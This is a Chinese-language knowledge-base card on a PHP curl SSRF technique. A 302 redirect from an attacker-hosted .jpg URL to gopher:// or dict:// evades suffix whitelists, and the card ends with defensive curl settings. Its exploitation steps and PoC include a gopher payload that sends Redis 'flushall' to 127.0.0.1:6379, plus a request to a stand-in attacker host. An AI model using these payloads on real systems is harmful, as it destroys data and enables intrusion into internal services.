---
id: web-generic-ssrf-curl-redirect-protocol-surface-suffix-whitelist-bypass
title: PHP curl SSRF 后缀白名单被 302 重定向旁路：默认 REDIR_PROTOCOLS 放行 dict/gopher 等，仅默认禁 file/scp
type: scenario
domain: web
path: web/generic/ssrf
technique: curl-redirect-protocol-surface-suffix-whitelist-bypass
tags:
- web
- ssrf
- php
- curl
- redirect
- gopher
- dict
- protocol-bypass
- code-audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V639
  verified_at: '2026-11-13T02:16:14+08:00'
  notes: 已对照原文全文与47张本地截图核对：pathinfo后缀白名单入口、CURLOPT_FOLLOWLOCATION、PHP文档REDIR_PROTOCOLS默认排除FILE/SCP且7.19.4引入(图15)、macOS curl 7.64.1与Ubuntu 7.68协议列表(图16/17)、Fuzz3 302跨协议与tcpdump(图40/41)、302→dict成功/302→smb不支持/收窄PROTOCOLS后gopher被禁(图44/46/47)均一致；已修正该卡对gopher被禁原因的描述(防御收窄CURLOPT_PROTOCOLS所致，非不同PHP环境缺协议)。dedup首候选为自身，其余https前缀302→gopher等为related非同链，保留。未验证点：各PHP/libcurl构建实际协议集需curl_version()现场确认
url: /docs/web/generic/ssrf/web-generic-ssrf-curl-redirect-protocol-surface-suffix-whitelist-bypass/
draft: false
kb_aliases:
- REDIR_PROTOCOLS 默认协议
- curl 重定向跨协议
- 后缀白名单 SSRF
- pathinfo 后缀校验绕过
- 302 跳 gopher/dict
- SSRF 协议面
---

## 一句话结论

PHP 用 curl 抓取用户 URL 时若开启 `CURLOPT_FOLLOWLOCATION` 且没有收窄 `CURLOPT_REDIR_PROTOCOLS`，入口处对 URL 的“后缀必须是 jpg/gif/png/ico”之类校验只作用于第一跳：攻击者让 `http://attacker/2.jpg` 返回 302 `Location: gopher://内网:端口/_<报文>`（或 dict 等），libcurl 默认会跟随到除 file/scp 之外的任意已编译协议，后缀白名单与协议前缀校验同时被旁路。

## 原理

- **校验对象错位**：`pathinfo($url, PATHINFO_EXTENSION)` 等校验只解析用户提交的那一串 URL；libcurl 跟随重定向时按 `Location` 重新解析目标，不会回头重新执行应用的扩展名/前缀检查。
- **默认重定向协议策略**：`CURLOPT_REDIR_PROTOCOLS`（7.19.4 引入）默认允许所有协议，**但排除 FILE 和 SCP**；pre-7.19.4 无条件跟随所有协议。也就是说，只要没显式设置该选项，302 跳到 dict/gopher/tftp/imap 等都能走通（前提是该 PHP 的 libcurl 编译进了对应协议）。
- **协议可用性依环境而变**：`curl_version()['protocols']` 在不同系统/发行版不同（macOS 自带 7.64.1 有 20 种；Ubuntu 7.68 多出 scp/sftp；Win10 自带更少）。原文中 302→`smb` 在目标环境报 “Protocol "smb" not supported or disabled in libcurl”，302→`dict` 实测成功（nc 收到 `set a=1`），302→`gopher` 在默认配置下可发出报文，而在把 `CURLOPT_PROTOCOLS`/`CURLOPT_REDIR_PROTOCOLS` 收窄为 HTTP/HTTPS 后报 “Protocol "gopher" not supported or disabled in libcurl”（后者是防御生效，并非该构建缺少 gopher）。
- **危害放大器**：gopher 等于任意 TCP 报文发送器（可打 Redis、FastCGI/FPM、MySQL 等）；dict 可向 dict 服务写 key/命令并读回；tftp 等也有各自攻击面。因此“只允许图片后缀”的 SSRF 并不等于只能做图片抓取。
- **file 为什么通常走不通**：重定向默认排除 FILE/SCP；原文还观测到即使把 `CURLPROTO_FILE` 显式加入 `CURLOPT_PROTOCOLS` 与 `CURLOPT_REDIR_PROTOCOLS`，该环境的重定向 file 仍报 “Protocol "file" not supported or disabled in libcurl”（属其环境观测，libcurl 版本/构建差异需另行确认）。
- **成功前提**：入口 URL 本身能通过校验（例如以 `.jpg` 结尾且攻击者控制该资源），curl 编译支持目标协议，目标端口可达。

## 触发条件

- 用户可控 URL 进入 PHP curl，且 `CURLOPT_FOLLOWLOCATION` 为 1（或客户端等价跟随重定向）。
- `CURLOPT_REDIR_PROTOCOLS` 未设置或仍包含 gopher/dict 等协议。
- 入口校验是扩展名白名单、`^https://` 前缀、域名/IP 黑名单等只针对第一跳的检查。
- 攻击者能控制首跳服务器（自有域名/临时隧道/任意可写页面）并返回 301/302。
- PHP 的 libcurl 编译支持 gopher/dict 等目标协议（`curl_version()` 可查）。

## 利用步骤

1. 用 `?url=http://your-host/2.jpg` 探测：确认应用会请求该 URL（DNS/HTTP 日志）。
2. 让该 URL 返回 `302`，`Location` 指向目标协议与内网地址：
   - `gopher://127.0.0.1:6379/_<urlencode(Redis 命令)>` 打未授权 Redis；
   - `gopher://127.0.0.1:9000/_<FastCGI 报文>` 打 PHP-FPM；
   - `dict://127.0.0.1:11211/...` 探测/操作 dict 类服务。
3. 观察应用回显（若把抓取结果落盘并返回 URL，就访问落盘文件读回响应；盲 SSRF 用 DNS/时延判断）。
4. 收窄协议范围验证：如果应用只放行 http/https，则此路不通，转向 307/308 方法保持或其它绕过。

## PoC

攻击者首跳服务（伪代码）：

```python
# http://attacker/2.jpg  ->  302
Location: gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
```

触发（入口后缀检查看到的是 `2.jpg`，通过白名单）：

```http
POST /include/file.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

url=http://attacker/2.jpg
```

curl 跟随 302 后实际发出 gopher 报文；若应用把响应写入 `files/download/xxx.jpg` 并回显 URL，访问该 URL 即可看到内部服务响应（原文即用此方式回显请求数据）。

## 变体与关联

- 与 `web-generic-ssrf-https-prefix-check-302-gopher-fastcgi` 同类但触发面不同：那边入口校验是 `^https://` 前缀，本卡是文件后缀白名单；可配合使用（入口必须 https 且必须以 .jpg 结尾时，用 https 域名的 `/2.jpg` 返回 302）。
- 与 `web-generic-ssrf-redirect-gopher-localhost-portscan-omi`、`web-generic-ssrf-tcpdf-link-href-filegetcontents-gopher` 共享“重定向跨协议”原语，末端目标不同。
- 与 `web-generic-ssrf-short-form-ip-302-post-to-get` 互补：那张是 302 把 POST 降为 GET，本卡是 302 换协议；307/308 方法保持见 `web-generic-ssrf-curl-307-308-method-preserve-internal-post`。

## 检测与防御

- 显式收窄协议（PHP 官方推荐的安全写法）：

```php
curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS | CURLPROTO_HTTP);
curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);
curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2);
```

- 关闭自动跟随，手工逐跳校验每跳的 scheme/host/IP（解析到私网即拒绝）。
- 不要只用扩展名/前缀做 SSRF 防护；对最终落盘内容的 MIME 与来源做二次校验。
- 监控 302 响应后 curl 改用非 http(s) 协议的出站连接（流量侧看 gopher/dict 端口）。
